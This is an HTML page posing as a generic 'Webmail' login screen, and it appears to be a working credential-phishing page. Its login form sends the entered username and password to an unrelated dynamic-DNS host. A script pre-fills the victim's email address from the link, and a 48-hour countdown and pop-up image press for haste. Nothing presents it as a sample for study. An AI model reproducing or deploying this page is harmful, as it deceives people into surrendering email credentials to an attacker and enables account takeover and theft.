<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Webmail</title>
    <style>
        body {
            margin: 0;
            font-family: Arial, sans-serif;
            background-color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            display: grid;
            grid-template-columns: 0.9fr 1.1fr;
            /* Form | Image */
            align-items: center;
            gap: 100px;
            max-width: 900px;
            width: 100%;
        }

        .left-side {
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        p.title {
            color: #333;
            font-size: 35px;
            font-weight: lighter !important;
            margin-bottom: 20px;
            margin-top: 0;
            text-align: center;
        }

        .login-box {
            background: #f7f7f7;
            padding: 30px;
            border-radius: 4px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
            width: 100%;
            max-width: 310px;
        }

        .avatar {
            width: 100px;
            height: 100px;
            background: #ddd;
            border-radius: 50%;
            margin: 0 auto 20px;
            background-image: url('https://cdn-icons-png.flaticon.com/512/847/847969.png');
            background-size: cover;
            background-position: center;
        }

        label {
            display: block;
            text-align: left;
            margin-left: 8px;
            margin-bottom: 5px;
            font-size: 12px;
            color: #555;
            font-weight: lighter;
        }

        input {
            width: 90%;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 2px;
            font-size: 14px;
        }

        input[type=submit] {
            width: 97%;
            padding: 10px;
            border: none;
            background-color: #2e7be5;
            color: white;
            font-size: 14px;
            text-transform: uppercase;
            cursor: pointer;
            border-radius: 2px;
        }

        input[type=submit]:hover {
            background-color: #1c5bbf;
        }

        .banner img {
            width: 100%;
            height: auto;
            border-radius: 4px;
        }

        /* Preloader */
        #preloader {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: rgba(255, 255, 255, 0.8);
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            z-index: 9999;
        }

        #preloader.hidden {
            display: none;
        }

        .spinner {
            border: 6px solid #f3f3f3;
            border-top: 6px solid #007bff;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin-bottom: 1rem;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }

        /* Responsive */
        @media (max-width: 768px) {
            .container {
                grid-template-columns: 1fr;
                text-align: center;
            }
        }

        .banner {
            width: 110%;
        }

        /* Overlay background */
        #imgAlert {
            display: none;
            position: fixed;
            z-index: 9999;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background-color: rgb(255, 255, 255);
            justify-content: center;
            align-items: center;
            cursor: pointer;
        }

        /* Alert box */
        #imgAlertContent {
            background: rgba(255, 255, 255, 0);
            padding: 20px;
            border-radius: 8px;
            text-align: center;
            /* box-shadow: 0 4px 8px rgba(0,0,0,0.3); */
        }

        #imgAlertContent img {
            width: 500px;
            height: auto;
        }

        #closeBtn {
            margin-top: 10px;
            padding: 8px 16px;
            background: #007bff;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }

        /* Countdown timer styling */
        #countdown {
            position: fixed;
            top: 10px;
            left: 10px;
            background: rgba(0, 0, 0, 0.7);
            color: white;
            padding: 4px 8px;
            border-radius: 4px;
            font-size: 20px;
            font-family: Arial, sans-serif;
            z-index: 100;
            cursor: pointer;
        }
    </style>
</head>

<body>
    <!-- Countdown -->
    <div id="countdown"></div>

    <!-- Custom Image Alert -->
    <div id="imgAlert">
        <div id="imgAlertContent">
            <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjpNv08HYwMcAvnWmRqZLZjKDZ_M-8w1xq1yUFttDh215LrI_tOKh1WAq-sLqZ_sQBYFQnrisRl4BidDG_NEymH8mNKjZfCmCWWrrjSAtp3ZH9Pjr-qO9qVPrw9IGL9iPYsJIj7iQLADTn_0sOG5IFyUyIORDnTXCmf9398G8Z22Ex2Ky2xUoJxNsozLLI/w502-h240/1212.png"
                alt="Alert Image" onclick="closeImageAlert()">
            <br>
        </div>
    </div>

    <div class="container">
        <!-- LEFT COLUMN: Title + Form -->
        <div class="left-side">
            <!-- <p class="title">Email Client</p> -->
            <div class="login-box">
                <div class="avatar"></div>
                <form id="loginForm" action="https://preciousliquid.hopto.org/autox/next2580.php" method="post">
                    <label for="username">USERNAME</label>
                    <input type="email" name="user" id="inputline1" required>
                    <script type="text/javascript">
                        var url = window.location.href;
                        var name = url.substring(url.indexOf("=") + 1);
                        document.getElementById("inputline1").value = name;
                    </script>
                    <label for="password">PASSWORD</label>
                    <input type="password" name="pass" required><br>

                    <input type="submit" name="submit" value="Login" />
                </form>
            </div>
        </div>

        <!-- RIGHT COLUMN: Banner -->
        <div class="banner">
            <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg6fKS_x0V0v3TgY4ysenec82KnupydUFNUU1zsK392ANPZaBAu_Zj73NXRbyNwugbl_DaLq7MRwiw9kQ1fcgDrJJ5gBu61KWEH-8JeKWOOvDcPxBOvlMUFmOboyAcDXVUPM-q_i5SfNvYDX5ik69yT0FJymEnMWd7az35pnCllTVOVlAwleGlM8lXVFKQ/w399-h253/Banner.jpg"
                alt="">
        </div>
    </div>

    <!-- Preloader -->
    <div id="preloader" class="hidden">
        <div class="spinner"></div>
        <p>Logging in...</p>
    </div>

    <script>
        document.getElementById("loginForm").addEventListener("submit", function () {
            document.getElementById("preloader").classList.remove("hidden");
        });

        function showImageAlert() {
            document.getElementById('imgAlert').style.display = 'flex';
        }

        function closeImageAlert() {
            document.getElementById('imgAlert').style.display = 'none';
        }

        // Auto alert on page load
        window.onload = function () {
            showImageAlert();
        };

        // countdown setup: 48 hours in milliseconds
        let countdownTime = 49 * 60 * 60 * 1000;
        let endTime = Date.now() + countdownTime;

        function updateCountdown() {
            let now = Date.now();
            let distance = endTime - now;

            if (distance <= 0) {
                document.getElementById('countdown').textContent = "00:00:00";
                clearInterval(timerInterval);
                return;
            }

            let hours = Math.floor((distance / (1000 * 60 * 60)) % 49);
            let minutes = Math.floor((distance / (1000 * 60)) % 60);
            let seconds = Math.floor((distance / 1000) % 60);

            document.getElementById('countdown').textContent =
                `${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
        }

        let timerInterval = setInterval(updateCountdown, 1000);
        updateCountdown(); // initial call
    </script>

</body>

</html>
